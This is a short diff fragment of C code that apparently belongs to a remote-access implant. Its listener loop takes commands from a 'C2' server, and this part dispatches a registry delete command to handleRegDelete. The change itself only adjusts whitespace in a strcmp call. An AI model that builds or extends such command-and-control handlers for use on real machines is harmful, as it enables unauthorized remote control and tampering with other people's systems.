@@ -189,7 +189,7 @@ INT startListen()
             }
 
             // C2 says to delete a registry key or value 
-            else if (strcmp((const char*) & recvBuf, REGDELETE) == 0)
+            else if (strcmp((const char*)&recvBuf, REGDELETE) == 0)
             {
                 status = handleRegDelete(clientSock);
                 {
